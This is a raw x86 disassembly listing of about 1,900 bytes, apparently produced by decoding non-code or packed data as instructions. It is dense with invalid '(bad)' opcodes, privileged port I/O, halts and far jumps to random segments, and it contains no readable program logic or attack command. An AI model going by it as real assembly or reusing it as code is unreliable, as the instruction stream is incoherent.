  41abee:	push   0xffffffd2
  41abf0:	mov    dl,0x94
  41abf2:	out    dx,eax
  41abf3:	ins    BYTE PTR es:[edi],dx
  41abf4:	repz jmp 0x83bbbc59
  41abfa:	aas    
  41abfb:	push   ebx
  41abfc:	add    bh,ch
  41abfe:	icebp  
  41abff:	mov    al,ds:0xf344bd13
  41ac04:	test   eax,0x4743871d
  41ac09:	mov    al,ds:0x2d3d60ed
  41ac0e:	call   0x8155:0x1d471981
  41ac15:	jle    0x41abdd
  41ac17:	dec    eax
  41ac18:	mov    ds:0x7421f73a,eax
  41ac1d:	stos   BYTE PTR es:[edi],al
  41ac1e:	xchg   ebx,eax
  41ac1f:	push   eax
  41ac20:	add    DWORD PTR [eax],eax
  41ac22:	hlt    
  41ac23:	out    0x2f,eax
  41ac25:	xchg   DWORD PTR [edx+ebx*1],eax
  41ac28:	std    
  41ac29:	jmp    0x41ac69
  41ac2b:	sbb    al,0x92
  41ac2d:	push   esi
  41ac2e:	xchg   ebx,eax
  41ac2f:	sahf   
  41ac30:	xor    BYTE PTR [esp+0x74],ch
  41ac34:	mov    dl,0x5a
  41ac36:	jb     0x41ac65
  41ac38:	xor    DWORD PTR [ecx-0x68c75207],0xefd3a095
  41ac42:	and    eax,0x5facb1a4
  41ac47:	cld    
  41ac48:	push   edi
  41ac49:	das    
  41ac4a:	int3   
  41ac4b:	mov    dh,0xd3
  41ac4d:	nop
  41ac4e:	add    DWORD PTR [esi-0x150bdbc7],esi
  41ac54:	jb     0x41abfe
  41ac56:	out    dx,al
  41ac57:	mov    cl,BYTE PTR [edi+0x7f83243]
  41ac5d:	xchg   ecx,eax
  41ac5e:	jmp    DWORD PTR ds:0xef62
  41ac63:	cmp    al,0xc1
  41ac65:	faddp  st(7),st
  41ac67:	pop    esp
  41ac68:	fwait
  41ac69:	jbe    0x41ac5f
  41ac6b:	pop    ebx
  41ac6c:	test   ecx,ecx
  41ac6e:	jno    0x41acbe
  41ac70:	nop
  41ac71:	imul   esp,DWORD PTR [edi+0x5f],0x5f
  41ac75:	mov    ecx,0xf28db139
  41ac7a:	fsubr  QWORD PTR [ebp-0x1efb7e2a]
  41ac80:	and    al,0x59
  41ac82:	stos   DWORD PTR es:[edi],eax
  41ac83:	out    0x7e,al
  41ac85:	cmp    eax,0x88471242
  41ac8a:	or     BYTE PTR [edi+0x26],0x6c
  41ac8e:	enter  0x4f32,0x1
  41ac92:	test   esp,edx
  41ac94:	popa   
  41ac95:	rcl    BYTE PTR [eax+0x2e],1
  41ac98:	and    eax,0x6fb7451a
  41ac9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac9e:	cmp    DWORD PTR [ebx-0x42],esp
  41aca1:	(bad)  
  41aca2:	hlt    
  41aca3:	or     al,0x94
  41aca5:	dec    ebx
  41aca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aca7:	mov    dl,cl
  41aca9:	data16 mov al,ds:0x2ddda4b7
  41acaf:	stos   DWORD PTR es:[edi],eax
  41acb0:	cmp    ecx,DWORD PTR [ebx-0x25e21221]
  41acb6:	add    BYTE PTR [edi-0x60],0x4b
  41acba:	pop    ebp
  41acbb:	mov    esi,DWORD PTR [edi+0x4b]
  41acbe:	jecxz  0x41ad0a
  41acc0:	xor    edx,DWORD PTR [edx+eax*1+0x4c]
  41acc4:	in     al,dx
  41acc5:	dec    esi
  41acc6:	repnz sub edx,DWORD PTR [esi]
  41acc9:	clc    
  41acca:	(bad)  
  41accb:	out    dx,eax
  41accc:	inc    ebp
  41accd:	nop
  41acce:	push   ss
  41accf:	push   cs
  41acd0:	daa    
  41acd1:	lock call 0xd2b6:0x35e6096e
  41acd9:	sahf   
  41acda:	sbb    bh,BYTE PTR [edi+0x59]
  41acdd:	out    dx,eax
  41acde:	ins    DWORD PTR es:[edi],dx
  41acdf:	hlt    
  41ace0:	cmp    edx,DWORD PTR [esi-0x21]
  41ace3:	(bad)  
  41ace5:	cmc    
  41ace6:	xchg   BYTE PTR gs:[ecx-0xb19f8a6],dl
  41aced:	repz iret 
  41acef:	add    al,0x12
  41acf1:	xor    ebx,DWORD PTR [eax+esi*1]
  41acf4:	dec    esi
  41acf5:	jo     0x41accb
  41acf7:	adc    DWORD PTR [ecx-0x46c59514],edi
  41acfd:	or     eax,0x965e7cd3
  41ad02:	es neg dl
  41ad05:	push   0x44ed34b1
  41ad0a:	retf   
  41ad0b:	jge    0x41aca9
  41ad0d:	test   DWORD PTR [eax],ebx
  41ad0f:	mov    eax,ds:0xf2db61cb
  41ad14:	stos   BYTE PTR es:[edi],al
  41ad15:	jae    0x41acb9
  41ad17:	jge    0x41ad59
  41ad19:	stc    
  41ad1a:	ins    BYTE PTR es:[edi],dx
  41ad1b:	(bad)  
  41ad1c:	cs aad 0x37
  41ad1f:	inc    ebx
  41ad20:	xchg   esi,eax
  41ad21:	retf   0x8d9e
  41ad24:	sbb    ebx,DWORD PTR [ebx-0x31e55168]
  41ad2a:	jmp    0x67bd:0x3630
  41ad30:	mov    ebx,0x766c6bff
  41ad35:	(bad)  
  41ad36:	rol    al,0x36
  41ad39:	mov    WORD PTR [ecx+0x74],cs
  41ad3c:	cmp    DWORD PTR [edx+ebx*4+0x27],esi
  41ad40:	adc    eax,0x8fe66239
  41ad45:	and    cl,bh
  41ad47:	mov    esi,0x11ab3d5
  41ad4c:	cli    
  41ad4d:	(bad)  
  41ad4e:	into   
  41ad4f:	gs mov ebx,0x4c6643ba
  41ad55:	daa    
  41ad56:	jp     0x41adc9
  41ad58:	dec    esi
  41ad59:	cli    
  41ad5a:	dec    ecx
  41ad5b:	faddp  st(7),st
  41ad5d:	ret    0x138d
  41ad60:	shl    BYTE PTR [edi],1
  41ad62:	(bad)  [esi]
  41ad64:	cwde   
  41ad65:	jp     0x41ad60
  41ad67:	mov    ds:0xa79b1720,al
  41ad6c:	xlat   BYTE PTR ds:[ebx]
  41ad6d:	loop   0x41adc2
  41ad6f:	loop   0x41ade7
  41ad71:	imul   eax,DWORD PTR [esi+edi*2-0x18],0xc1ac7dd7
  41ad79:	jmp    0x41adda
  41ad7b:	stc    
  41ad7c:	in     al,dx
  41ad7d:	idiv   DWORD PTR [eax]
  41ad7f:	pop    es
  41ad80:	lods   eax,DWORD PTR ds:[esi]
  41ad81:	pop    es
  41ad82:	push   eax
  41ad83:	(bad)  
  41ad84:	xchg   ebx,eax
  41ad85:	cmp    ebx,DWORD PTR [eax+ecx*1]
  41ad88:	xchg   bh,al
  41ad8a:	out    0x9c,eax
  41ad8c:	mov    ecx,DWORD PTR ds:0x2de84ac2
  41ad92:	xchg   bp,si
  41ad95:	sti    
  41ad96:	pop    eax
  41ad97:	xor    al,0xc3
  41ad99:	std    
  41ad9a:	inc    esi
  41ad9b:	cmp    ebp,DWORD PTR ss:[edi]
  41ad9e:	clc    
  41ad9f:	(bad)
  41ada2:	enter  0xf3fb,0xd9
  41ada6:	mov    dh,0x69
  41ada8:	addr16 pop esp
  41adaa:	and    BYTE PTR [esi-0x4c],bl
  41adad:	cmp    ch,BYTE PTR ds:0xcdce085b
  41adb3:	leave  
  41adb4:	mov    al,ds:0x599fdc3
  41adb9:	push   es
  41adba:	mov    al,ds:0x618c610f
  41adbf:	mov    dh,0x5f
  41adc1:	jbe    0x41add3
  41adc3:	add    cl,dl
  41adc5:	hlt    
  41adc6:	test   al,0xf5
  41adc8:	mov    ebx,0x6b4f1491
  41adcd:	xchg   DWORD PTR [ebp+0x3f],ebx
  41add0:	mov    cl,0x3c
  41add2:	mov    esp,0xf55c1d7f
  41add7:	out    dx,eax
  41add8:	cmc    
  41add9:	inc    ebp
  41adda:	jnp    0x41ae50
  41addc:	jno    0x41ae43
  41adde:	sbb    esi,DWORD PTR [eax-0x441af3e9]
  41ade4:	pop    edi
  41ade5:	jo     0x41ae48
  41ade7:	aaa    
  41ade8:	jmp    0xad2bc9cf
  41aded:	xor    dh,BYTE PTR ds:0x3c2f259f
  41adf3:	push   eax
  41adf4:	mov    ebp,0x76df1728
  41adf9:	push   ecx
  41adfa:	gs leave 
  41adfc:	cwde   
  41adfd:	and    eax,ebx
  41adff:	cli    
  41ae00:	rol    DWORD PTR [edx+0x2b],cl
  41ae03:	scas   al,BYTE PTR es:[edi]
  41ae04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae05:	fisttp WORD PTR [ecx+0x2c]
  41ae08:	je     0x41ae5e
  41ae0a:	outs   dx,BYTE PTR ds:[esi]
  41ae0b:	shl    BYTE PTR [eax-0x75],cl
  41ae0e:	lock stos DWORD PTR es:[edi],eax
  41ae10:	xchg   edi,edx
  41ae12:	push   esp
  41ae13:	or     al,0xb7
  41ae15:	cwde   
  41ae16:	imul   esi,DWORD PTR [esp+edi*4+0x6610a170],0x1c
  41ae1e:	rcl    dl,1
  41ae20:	xor    BYTE PTR [ecx-0x67],dh
  41ae23:	add    esi,DWORD PTR [ebx-0xf]
  41ae26:	jmp    0xb225e3dd
  41ae2b:	push   0xcad6b287
  41ae30:	jb     0x41ae46
  41ae32:	cli    
  41ae33:	into   
  41ae34:	cmc    
  41ae35:	mov    bh,0x6f
  41ae37:	adc    BYTE PTR [ebx+0x5f9e50f9],ah
  41ae3d:	or     BYTE PTR [esi-0x12],al
  41ae40:	jle    0x41ae0d
  41ae42:	jle    0x41ae1d
  41ae44:	jo     0x41ae01
  41ae46:	mul    DWORD PTR [eax-0x7f]
  41ae49:	cmp    bl,dl
  41ae4b:	outs   dx,DWORD PTR ds:[esi]
  41ae4c:	repz jle 0x41aec6
  41ae4f:	int    0x2c
  41ae51:	clc    
  41ae52:	mov    ebx,0x8cdda16c
  41ae57:	xor    dl,BYTE PTR [edi]
  41ae59:	loope  0x41adff
  41ae5b:	inc    ebx
  41ae5c:	and    ebp,DWORD PTR [ebx-0x38]
  41ae5f:	test   BYTE PTR [ebx-0x3012ccfd],dh
  41ae65:	std    
  41ae66:	adc    BYTE PTR [ebx+ecx*4+0x4ef3f67c],dl
  41ae6d:	pop    DWORD PTR [ecx]
  41ae6f:	sahf   
  41ae70:	pop    ecx
  41ae71:	retf   
  41ae72:	xor    BYTE PTR [esi+0x4d05ee4c],bh
  41ae78:	push   esp
  41ae79:	push   ebp
  41ae7a:	adc    BYTE PTR [ebp+0x4440288b],0xc
  41ae81:	sahf   
  41ae82:	pop    esp
  41ae83:	mov    bh,0x48
  41ae85:	iret   
  41ae86:	rcr    BYTE PTR [edx+0x19ebf013],cl
  41ae8c:	jo     0x41ae67
  41ae8e:	sbb    cl,0x36
  41ae91:	call   0xfdb2fc0
  41ae96:	jae    0x41ae1f
  41ae98:	mov    WORD PTR [eax-0xad69630],?
  41ae9e:	ror    DWORD PTR [esi-0x8bb6184],1
  41aea4:	test   DWORD PTR [ebx],eax
  41aea6:	lods   al,BYTE PTR ds:[esi]
  41aea7:	push   eax
  41aea8:	or     esp,DWORD PTR [eax]
  41aeaa:	mov    ds:0xf78e903f,al
  41aeaf:	stc    
  41aeb0:	push   cs
  41aeb1:	ret    
  41aeb2:	cmc    
  41aeb3:	xchg   esi,eax
  41aeb4:	mov    BYTE PTR [edi+0x50],al
  41aeb7:	retf   0xd622
  41aeba:	sub    esi,DWORD PTR [ebp-0x5f]
  41aebd:	adc    BYTE PTR [edi],0x8f
  41aec0:	clc    
  41aec1:	shr    BYTE PTR [edi+0x10e93563],cl
  41aec7:	sbb    dl,BYTE PTR [esi+0x4df0229f]
  41aecd:	xor    DWORD PTR [edx-0x3e648906],eax
  41aed3:	mov    edx,0xf89a97a4
  41aed8:	mov    al,ds:0x319c2221
  41aedd:	aas    
  41aede:	and    esp,ecx
  41aee0:	mov    DWORD PTR [ebp+0x2e1a6ff3],eax
  41aee6:	arpl   ax,bx
  41aee8:	mov    ebx,0xfeb61ded
  41aeed:	and    DWORD PTR [edx+0x32],ebp
  41aef0:	imul   ebp,DWORD PTR [eax+esi*2-0x542571e4],0xd0f25c02
  41aefb:	mov    edx,0x5b442c24
  41af00:	inc    eax
  41af01:	int3   
  41af02:	xchg   esp,eax
  41af03:	xor    esp,edx
  41af05:	push   edi
  41af06:	fistp  QWORD PTR [ebp-0x2a84d607]
  41af0c:	mov    al,BYTE PTR [edi+ebp*2-0x5406aff0]
  41af13:	call   0xfcd5:0xf2a72a56
  41af1a:	cmp    bh,dl
  41af1c:	dec    edi
  41af1d:	jge    0x41af5a
  41af1f:	leave  
  41af20:	inc    edi
  41af21:	mov    eax,DWORD PTR [esi]
  41af23:	inc    edx
  41af24:	inc    eax
  41af25:	mov    cl,0x3d
  41af27:	aas    
  41af28:	fxch   st(7)
  41af2a:	mov    dh,dl
  41af2c:	push   0xffffffdc
  41af2e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41af30:	pop    ebp
  41af31:	xchg   esp,eax
  41af32:	cmp    eax,DWORD PTR [esi+edi*4+0x5030b30]
  41af39:	dec    esi
  41af3a:	daa    
  41af3b:	mov    DWORD PTR [ecx],ebp
  41af3d:	pop    esp
  41af3e:	test   al,0xcb
  41af40:	push   edx
  41af41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af42:	(bad)  
  41af43:	cmp    BYTE PTR [edx],dh
  41af45:	call   0xac69675b
  41af4a:	and    eax,0x5182fbfa
  41af4f:	mov    ah,0xbb
  41af51:	push   esp
  41af52:	arpl   WORD PTR [ebx-0x5f5a75cb],sp
  41af58:	ret    
  41af59:	jo     0x41af17
  41af5b:	xor    eax,0xc3453b56
  41af60:	xor    cl,BYTE PTR [ecx+0x2a]
  41af63:	imul   ecx,DWORD PTR [edi+0x4dadc4b9],0x50ab5628
  41af6d:	ror    DWORD PTR [esi],1
  41af6f:	repnz test al,0x57
  41af72:	loopne 0x41afec
  41af74:	and    BYTE PTR [ecx-0x22d6cfd6],0xc
  41af7b:	in     eax,dx
  41af7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af7d:	sub    dl,BYTE PTR [edx]
  41af7f:	cmp    DWORD PTR fs:[ebx+0xb2926ea],0xffffff9f
  41af87:	xchg   BYTE PTR ds:0xbc4b85ce,ah
  41af8d:	dec    ebp
  41af8e:	mov    ecx,esp
  41af90:	mov    bl,BYTE PTR [ecx-0x61]
  41af93:	js     0x41af81
  41af95:	fcomp  st(4)
  41af97:	je     0x41af68
  41af99:	pop    ebp
  41af9a:	or     al,0x66
  41af9c:	shrd   edi,ebx,cl
  41af9f:	fnstenv [ebx-0x65]
  41afa2:	jmp    0xb79eef86
  41afa7:	sub    BYTE PTR [edi+0x6a5ef41b],cl
  41afad:	fwait
  41afae:	push   eax
  41afaf:	sub    BYTE PTR [ecx],0x4b
  41afb2:	xchg   ebx,eax
  41afb3:	mov    ch,0xae
  41afb5:	mov    cl,0x58
  41afb7:	div    BYTE PTR [ecx+0x55]
  41afba:	mov    bh,0xed
  41afbc:	add    eax,0x529d583d
  41afc1:	adc    BYTE PTR es:[edx-0x336f2f3c],dl
  41afc8:	push   cs
  41afc9:	mov    ds:0x8465a732,eax
  41afce:	(bad)  
  41afcf:	and    eax,0xbe41cfbe
  41afd4:	fiadd  WORD PTR [esi]
  41afd6:	mov    ecx,0x20f406f0
  41afdb:	fs ss (bad) 
  41afde:	mov    ebx,0x17404b64
  41afe3:	rcr    DWORD PTR [ecx+eax*1],1
  41afe6:	xchg   edi,eax
  41afe7:	shl    DWORD PTR ds:0xb40e4025,0x28
  41afee:	dec    ebp
  41afef:	pop    ecx
  41aff0:	(bad)  
  41aff1:	pop    edx
  41aff2:	jnp    0x41b053
  41aff4:	call   0x3b5:0x32db5acb
  41affb:	pop    esi
  41affc:	outs   dx,BYTE PTR ds:[esi]
  41affd:	xchg   edx,eax
  41affe:	fnstenv [edi]
  41b000:	or     bh,ch
  41b002:	outs   dx,DWORD PTR ds:[esi]
  41b003:	pushf  
  41b004:	sub    eax,0x802daf6e
  41b009:	inc    edx
  41b00a:	fcomp  QWORD PTR [esi]
  41b00c:	not    BYTE PTR [esi-0x6ec8b7d8]
  41b012:	xor    BYTE PTR [edi+0x36],ah
  41b015:	adc    eax,0x342e468
  41b01a:	push   es
  41b01b:	mov    esi,0x14ac1f7
  41b020:	(bad)  
  41b021:	cmp    BYTE PTR [esi],dl
  41b023:	add    DWORD PTR [esi+0x28],edi
  41b026:	sub    eax,0xbbe4ac55
  41b02b:	mov    dl,0x23
  41b02d:	pop    esi
  41b02e:	jle    0x41b046
  41b030:	jbe    0x41b01c
  41b032:	in     al,0x6c
  41b034:	mov    al,0x6a
  41b036:	mov    ch,0x60
  41b038:	jne    0x41b065
  41b03a:	and    BYTE PTR ds:0xc86fbfcd,dh
  41b040:	stos   BYTE PTR es:[edi],al
  41b041:	sbb    dh,dl
  41b043:	jecxz  0x41b037
  41b045:	mov    dh,0x6b
  41b047:	(bad)  
  41b048:	cmp    DWORD PTR [esi],esi
  41b04a:	sub    DWORD PTR [ecx],esp
  41b04c:	xchg   edi,eax
  41b04d:	mov    bl,0xec
  41b04f:	and    ecx,esi
  41b051:	xchg   edi,eax
  41b052:	or     DWORD PTR [edi],ebp
  41b054:	pushf  
  41b055:	inc    esp
  41b056:	jmp    0x35bf0a63
  41b05b:	adc    ebx,ecx
  41b05d:	sbb    al,al
  41b05f:	cli    
  41b060:	fistp  DWORD PTR [esi-0x8]
  41b063:	mov    ah,BYTE PTR [eax+0x675688b1]
  41b069:	xchg   ebx,eax
  41b06a:	cld    
  41b06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06c:	push   cs
  41b06d:	retf   0xc912
  41b070:	pop    ss
  41b071:	mov    fs,WORD PTR [edi+edx*1-0x69]
  41b075:	popf   
  41b076:	cs clc 
  41b078:	xlat   BYTE PTR ds:[ebx]
  41b079:	mov    BYTE PTR [ecx+0x1a],ch
  41b07c:	sar    DWORD PTR [ecx-0x75d93a39],cl
  41b082:	sbb    dh,bl
  41b084:	pop    ecx
  41b085:	lds    edi,FWORD PTR [edi+0x45b46821]
  41b08b:	(bad)  
  41b08c:	mov    edi,0x5444b914
  41b091:	pop    esi
  41b092:	or     eax,0x9379b2b5
  41b097:	pop    edi
  41b098:	out    dx,al
  41b099:	imul   ecx,DWORD PTR cs:[edi+esi*1-0x40],0x70
  41b09f:	div    esp
  41b0a1:	repz int 0x36
  41b0a4:	and    ah,BYTE PTR [esi-0x4603d757]
  41b0aa:	shl    BYTE PTR ds:0xdc72bc67,cl
  41b0b0:	jns    0x41b083
  41b0b2:	cmp    al,0x6a
  41b0b4:	cmp    DWORD PTR [edx+0x23],ebp
  41b0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b8:	xchg   ecx,eax
  41b0b9:	sbb    dl,BYTE PTR ds:0x87b4b767
  41b0bf:	xor    eax,0xb65d681d
  41b0c4:	push   esi
  41b0c5:	scas   eax,DWORD PTR es:[edi]
  41b0c6:	push   ecx
  41b0c7:	sub    BYTE PTR [ebp-0x29],dl
  41b0ca:	dec    ecx
  41b0cb:	clc    
  41b0cc:	fs sbb eax,0xc418165d
  41b0d2:	xchg   BYTE PTR [esi-0xdddf8bf],bl
  41b0d8:	xchg   edx,eax
  41b0d9:	mov    cl,0x1e
  41b0db:	rcr    DWORD PTR [edi-0x6f44be7a],0x92
  41b0e2:	xor    ebx,edi
  41b0e4:	aaa    
  41b0e5:	loope  0x41b0bf
  41b0e7:	xchg   ebp,eax
  41b0e8:	(bad)  
  41b0ea:	mov    edx,0xe1a64f3d
  41b0ef:	mov    cl,0x78
  41b0f1:	retf   
  41b0f2:	stos   BYTE PTR es:[edi],al
  41b0f3:	sbb    bh,BYTE PTR [edi-0x108aaec6]
  41b0f9:	cwde   
  41b0fa:	dec    esi
  41b0fb:	sub    ebx,DWORD PTR [edi-0x30]
  41b0fe:	test   ah,bl
  41b100:	xchg   edi,eax
  41b101:	or     DWORD PTR [ebp-0x3],ebp
  41b104:	xchg   edx,eax
  41b105:	push   edi
  41b106:	shr    BYTE PTR [ecx+0x1bb630c4],0xe5
  41b10d:	fsubr  QWORD PTR [eax+0x4ec0011d]
  41b113:	mov    ah,BYTE PTR [edx-0x56]
  41b116:	xchg   edi,eax
  41b117:	xchg   ecx,eax
  41b118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b119:	xchg   edx,eax
  41b11a:	in     al,0x6a
  41b11c:	mov    WORD PTR [edx+0x484b28aa],gs
  41b122:	xchg   dl,dl
  41b124:	sbb    al,0xa1
  41b126:	stc    
  41b127:	test   eax,0x8a3ca164
  41b12c:	push   cs
  41b12d:	cli    
  41b12e:	shl    DWORD PTR [ebx+0x57],0x8e
  41b132:	loop   0x41b1a3
  41b134:	jmp    0x41b0d1
  41b136:	or     eax,0xb23ab56d
  41b13b:	push   edx
  41b13c:	(bad)  
  41b13d:	push   ebx
  41b13e:	adc    eax,0x799dcd32
  41b143:	fcomp  st(6)
  41b145:	sahf   
  41b146:	mov    BYTE PTR [edx+esi*2+0x10],bl
  41b14a:	mov    ebp,0x89a710e8
  41b14f:	push   ebx
  41b150:	mov    dl,0x3b
  41b152:	test   al,0x98
  41b154:	dec    edi
  41b155:	xor    al,0xf5
  41b157:	mov    ds:0x6daa6274,al
  41b15c:	jmp    0xfc21ea3
  41b161:	(bad)  
  41b162:	sahf   
  41b163:	outs   dx,DWORD PTR ds:[esi]
  41b164:	mov    edi,0x3c705c99
  41b169:	mov    DWORD PTR [ecx+0x1d],edx
  41b16c:	mov    dl,0x94
  41b16e:	bound  esp,QWORD PTR [edi+edx*8]
  41b171:	pop    edi
  41b172:	sbb    al,0xde
  41b175:	outs   dx,DWORD PTR ds:[esi]
  41b176:	jg     0x41b167
  41b178:	or     DWORD PTR [esi*4+0x3ea05b2d],0x29
  41b180:	call   0xdde8:0xf20e19e
  41b187:	(bad)  
  41b188:	in     eax,dx
  41b189:	fild   QWORD PTR [edx+edx*4-0x5bbd3e9e]
  41b190:	js     0x41b1d5
  41b192:	call   0x2a62b824
  41b197:	and    eax,0x6584329a
  41b19c:	inc    edx
  41b19d:	xor    BYTE PTR [ebx],dh
  41b19f:	mov    esi,ebp
  41b1a1:	jb     0x41b1c3
  41b1a3:	jmp    0xa010:0x2fa7c38d
  41b1aa:	test   BYTE PTR [ecx+esi*2-0x65],dh
  41b1ae:	adc    BYTE PTR [ebp+0x1149735a],bl
  41b1b4:	or     ecx,eax
  41b1b6:	push   0x27181614
  41b1bb:	jns    0x41b21a
  41b1bd:	mov    esi,0x72f4fe0b
  41b1c2:	pop    esi
  41b1c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1c4:	and    DWORD PTR [ecx],esi
  41b1c6:	sub    BYTE PTR [edx],cl
  41b1c8:	fwait
  41b1c9:	sbb    DWORD PTR [ebx+0x3c20f770],ecx
  41b1cf:	or     al,0xbd
  41b1d1:	xor    BYTE PTR [edi-0x4cdc454f],0xda
  41b1d8:	jae    0x41b1a3
  41b1da:	pop    edi
  41b1db:	and    eax,0x683c145c
  41b1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1e1:	out    0x36,al
  41b1e3:	stos   DWORD PTR es:[edi],eax
  41b1e4:	retf   
  41b1e5:	mov    ecx,0xd9d54709
  41b1ea:	lds    ebp,FWORD PTR [ecx+0x67150769]
  41b1f0:	iret   
  41b1f1:	lea    ecx,[ebx-0x73]
  41b1f4:	lods   eax,DWORD PTR es:[esi]
  41b1f6:	in     al,dx
  41b1f7:	call   0x33ce:0x1fac818
  41b1fe:	lock in eax,dx
  41b200:	test   BYTE PTR [ebp+0x1f],cl
  41b203:	cmp    DWORD PTR [edi],ebp
  41b205:	xchg   dh,bh
  41b207:	push   ecx
  41b208:	push   edi
  41b209:	stc    
  41b20a:	daa    
  41b20b:	(bad)  
  41b20c:	retf   0x81e6
  41b20f:	fnstcw WORD PTR [ecx+0x450fda5f]
  41b215:	xchg   esp,eax
  41b216:	push   esi
  41b217:	xorps  xmm5,XMMWORD PTR [edx]
  41b21a:	pcmpeqd mm0,mm3
  41b21d:	xor    eax,0xadeb7313
  41b222:	mov    al,ds:0x4794c628
  41b227:	pop    edi
  41b228:	and    edi,edx
  41b22a:	xchg   edx,eax
  41b22b:	scas   al,BYTE PTR es:[edi]
  41b22c:	dec    esp
  41b22d:	cwde   
  41b22e:	push   edi
  41b22f:	adc    esp,DWORD PTR [ebx+0x38]
  41b232:	and    edi,esp
  41b234:	scas   eax,DWORD PTR es:[edi]
  41b235:	cs retf 0x4aba
  41b239:	xor    edi,edi
  41b23b:	fild   WORD PTR [edx-0x55]
  41b23e:	aaa    
  41b23f:	sub    eax,DWORD PTR [ebp-0x3bd086b4]
  41b245:	xchg   ebp,eax
  41b246:	(bad)  
  41b247:	dec    esi
  41b248:	sub    BYTE PTR [ebx],0xdf
  41b24b:	dec    ebp
  41b24c:	push   ebx
  41b24d:	cdq    
  41b24e:	mov    al,0x4b
  41b250:	mov    esi,0xc7c143a5
  41b255:	mov    dl,0x9b
  41b257:	test   BYTE PTR [edi],ch
  41b259:	sar    BYTE PTR [ecx+0x5c],0xc9
  41b25d:	clc    
  41b25e:	les    eax,FWORD PTR [ebp+0xd8d5316]
  41b264:	xchg   esi,eax
  41b265:	enter  0x5fab,0xc1
  41b269:	pop    ecx
  41b26a:	ja     0x41b26c
  41b26c:	ss mov bl,0x4
  41b26f:	sahf   
  41b270:	cwde   
  41b271:	push   esp
  41b272:	imul   edi,DWORD PTR [edx-0x1c8ebed6],0x5415810f
  41b27c:	cmp    al,dh
  41b27e:	hlt    
  41b27f:	xor    al,0xf1
  41b281:	mov    dl,0xc3
  41b283:	add    bl,BYTE PTR [ebx]
  41b285:	(bad)  
  41b286:	enter  0xd65d,0x39
  41b28a:	(bad)  
  41b28b:	sbb    eax,0x1ec5de69
  41b290:	and    eax,0xffffff9e
  41b293:	call   0x23a8:0x2279aa6d
  41b29a:	cmp    DWORD PTR [ebx-0x6c89d622],ebx
  41b2a0:	fiadd  WORD PTR [edx-0x453b3cde]
  41b2a6:	out    0x7b,eax
  41b2a8:	inc    eax
  41b2a9:	or     al,0xa3
  41b2ab:	out    dx,al
  41b2ac:	xor    BYTE PTR ds:0x24c84488,bl
  41b2b2:	mov    DWORD PTR [esi-0x2b9392b7],ebx
  41b2b8:	adc    eax,0x9033e679
  41b2bd:	les    esp,FWORD PTR [ecx]
  41b2bf:	pop    eax
  41b2c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2c1:	int3   
  41b2c2:	mov    ecx,DWORD PTR [eax]
  41b2c4:	repz ret 
  41b2c6:	mov    edx,0xb868705a
  41b2cb:	jle    0x41b2a2
  41b2cd:	mov    cl,0x30
  41b2cf:	xor    al,0x4c
  41b2d1:	sahf   
  41b2d2:	and    ebp,0x9d2f2fad
  41b2d8:	sub    BYTE PTR [eax+0x60],cl
  41b2db:	xchg   DWORD PTR [edx+edi*4-0x348b03a0],esp
  41b2e2:	call   0x233d:0x5f3d87bb
  41b2e9:	pop    edi
  41b2ea:	jge    0x41b277
  41b2ec:	pop    ebx
  41b2ed:	xchg   BYTE PTR [ebx+0x40],ch
  41b2f0:	sub    ebp,DWORD PTR [eax+esi*2]
  41b2f3:	adc    BYTE PTR [ecx-0x5b2c2c0f],bl
  41b2f9:	ins    DWORD PTR es:[edi],dx
  41b2fa:	pop    edi
  41b2fb:	(bad)  
  41b2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2fd:	in     eax,dx
  41b2fe:	cdq    
  41b2ff:	aam    0x7c
  41b301:	xchg   esi,eax
  41b302:	iret   
  41b303:	pop    ss
  41b304:	adc    edi,eax
  41b306:	lods   al,BYTE PTR gs:[esi]
  41b308:	mov    ebx,0xee7a6f69
  41b30d:	pop    es
  41b30e:	dec    edx
  41b30f:	push   0x4d69dbb2
  41b314:	or     bh,al
  41b316:	mov    ch,0xf5
  41b318:	or     ch,BYTE PTR [esi+0x34463fe5]
  41b31e:	cmp    eax,0x83e04df7
  41b323:	ins    BYTE PTR es:[edi],dx
  41b324:	xchg   edi,eax
  41b325:	mov    ebp,0x6ceb0fd6
  41b32a:	sub    BYTE PTR [ebp+0x2c],bl
  41b32d:	fnstenv [eax]
  41b32f:	push   esi
  41b330:	add    eax,0xab0b62f9
  41b335:	test   eax,0xce812afd
  41b33a:	cwde   
  41b33b:	mov    WORD PTR [edx-0x79dab816],fs
  41b341:	addr16 push edi
  41b343:	vxorps ymm0,ymm7,ymm3
  41b347:	fsub   st(7),st
  41b349:	xor    BYTE PTR [eiz*4+0x28386e03],al
  41b350:	jmp    0x41b3c3
  41b352:	inc    ecx
  41b353:	and    DWORD PTR [ecx+0x66],edi
  41b356:	mov    al,dh
  41b358:	xor    al,0xa2
  41b35a:	aaa    
  41b35b:	cld    
  41b35c:	add    dl,dl
  41b35e:	cwde   
  41b35f:	out    0x10,al
  41b361:	bnd ret 
  41b363:	in     al,dx
  41b364:	rcr    DWORD PTR ds:0x44ac5928,1
  41b36a:	test   eax,0x1fb7a319
  41b36f:	sbb    eax,0x5714efa9
  41b374:	test   bl,0xc5
  41b377:	mov    esp,0x3b653696
  41b37c:	jb     0x41b34b
  41b37e:	fwait
  41b37f:	and    BYTE PTR [edx],bl
  41b381:	mov    ds:0xa778f8ed,eax
  41b386:	push   esi
  41b387:	enter  0xdec8,0x3f
  41b38b:	jecxz  0x41b3fd
  41b38d:	je     0x41b3b1
  41b38f:	push   eax
  41b390:	or     ecx,DWORD PTR [ecx+0x1e]
  41b393:	pop    eax
  41b394:	sbb    eax,0xc117a679
  41b399:	es push esp
  41b39b:	in     eax,0x81
  41b39d:	and    DWORD PTR [ebx+0x538171a6],edx
